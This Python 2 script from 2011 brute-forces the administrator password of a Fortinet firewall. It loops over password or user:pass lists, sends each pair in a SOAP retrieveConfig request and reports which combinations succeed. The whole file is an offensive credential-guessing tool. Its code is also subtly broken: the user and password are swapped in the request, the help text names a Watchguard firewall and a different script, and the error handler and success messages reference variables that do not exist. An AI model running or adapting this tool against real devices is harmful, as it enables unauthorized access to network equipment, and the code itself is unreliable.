#!/usr/bin/python
# Copyright 2011 Stephen Haywood aka AverageSecurityGuy
#
#   This program is free software: you can redistribute it and/or modify
#   it under the terms of the GNU General Public License as published by
#   the Free Software Foundation, either version 3 of the License, or
#   (at your option) any later version.
#
#   This program is distributed in the hope that it will be useful,
#   but WITHOUT ANY WARRANTY; without even the implied warranty of
#   MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
#   GNU General Public License for more details.
#
#   You should have received a copy of the GNU General Public License
#   along with this program.  If not, see <http://www.gnu.org/licenses/>.
#
# fortinet_soap_bf.py attempts to bruteforce the password on a Fortinet 
# firewall using the SOAP interface.

import urllib2
import ssl
import re
import argparse

#-----------------------------------------------------------------------------
# Constants
#-----------------------------------------------------------------------------

#-----------------------------------------------------------------------------
# Functions
#-----------------------------------------------------------------------------
def list_from_file(filename):
	tmp = []
	try:
		f = open(filename, 'r')
	except:
		print "Could not open file: {0}".format(f.name())

	for line in f:
		tmp.append(line.rstrip('\r\n'))

	return tmp

def build_request(url, user, pwd):
	auth = """<r20:retrieveConfig>
<servicePass>
<password>{0}</password>
<userID>{1}</userID>
</servicePass>
</r20:retrieveConfig>""".format(user, pwd)

	req = """<?xml version="1.0" encoding="UTF-8"?>
<SOAP-ENV:Envelope 
SOAP-ENV:encodingStyle="http://schemas.xmlsoap.org/soap/encoding/"  
xmlns:SOAP-ENV="http://schemas.xmlsoap.org/soap/envelope/">
<SOAP-ENV:Body>{0}</SOAP-ENV:Body>
</SOAP-ENV:Envelope>	""".format(auth)

	return req

def check_user_pass(url, user, pwd):
	soap = build_request(url, user, pwd)
	print soap
	headers = {
		'Content-Type': 'text/xml; charset=utf-8'
	}

	req = urllib2.Request(url, soap, headers)
	resp = urllib2.urlopen(req).read()
	if re.search('task failed', resp):
		print "Failed: {0}, {1}".format(u, p)
	else:
		print resp
		print "Success: {0}, {1}".format(u, p)


#-----------------------------------------------------------------------------
# Main Program
#-----------------------------------------------------------------------------

#Parse command line arguments using argparse
desc = """firewarebf.py attempts to bruteforce the password on a Watchguard
firewall. You will need to provide the IP address of the firewall, the login 
domain, and the login credentials to test.
"""
parser = argparse.ArgumentParser(description=desc)
parser.add_argument('server', action='store', default='192.168.0.1',
					help="Ip address of server (Default: 192.168.0.1)")

passgroup = parser.add_mutually_exclusive_group(required=True)
passgroup.add_argument('-p', action='store', default=None, metavar='passfile',
		help='List of passwords. Will use default username of admin.')
passgroup.add_argument('-f', action='store', default=None,
					   metavar='userpassfile',
					   help='List of user:pass combinations.')
parser.add_argument('--http', action='store_true', default=False,
					help='Use an HTTP connection instead of HTTPS')

args = parser.parse_args()

# Set the URL based on --http flag
if args.http:
	url = "http://{0}:8080/".format(args.server)
else:
	url = "https://{0}:8080/".format(args.server)
	
# Test the passwords
if args.f:
	for c in list_from_file(args.f):
		u, p = c.split(":")
		check_user_pass(url, u, p)
else:
	users = ['admin']
	pwds = list_from_file(args.p)
	for u in users:
		for p in pwds:
			check_user_pass(url, u, p)

